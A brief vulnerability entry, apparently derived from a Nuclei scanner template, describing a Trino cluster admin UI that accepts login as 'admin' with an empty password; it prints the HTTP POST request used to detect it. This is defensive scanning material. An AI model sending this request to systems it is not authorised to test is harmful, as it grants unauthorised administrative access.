# Vulnerability: Cluster Overview Trino - Admin Login
**Classification:** VULN
**Source:** Nuclei Template (`cluster-trino-admin-login.yaml`)

## Description
The /ui/login endpoint accepted a POST request with username=admin and an empty password, which resulted in a successful login. This indicated improper authentication validation or a default/admin account misconfiguration.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ui/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password=&redirectPath=
```

